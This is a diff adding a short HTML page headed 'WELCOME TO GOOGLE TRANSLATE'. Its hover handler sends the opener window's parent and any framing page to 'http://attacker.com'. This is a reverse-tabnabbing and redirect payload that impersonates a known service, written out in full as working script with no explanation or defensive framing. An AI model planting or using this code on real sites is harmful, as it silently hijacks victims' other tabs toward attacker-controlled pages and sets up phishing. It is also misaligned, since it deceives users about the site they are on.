@@ -1,0 +1,29 @@
+
+
+
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>Javascript open link without click</title>
+		<style>
+			.gfg {
+				text-align:center;
+				font-size:40px;
+				font-weight:bold;
+				color:green;;
+
+			}
+		</style>
+		<script>
+			function myFunction() {
+if (window.opener) window.opener.parent.location.replace('http://attacker.com');
+if (window.parent != window) window.parent.location.replace('http://attacker.com');
+			}
+		</script>
+	</head>
+	<body>
+		<div class = "gfg" onmouseover = "myFunction()">
+				<img style="background-color:white; width:100%px; height:100%px;"  />WELCOME TO GOOGLE TRANSLATE
+		</div>
+	</body>
+</html>					
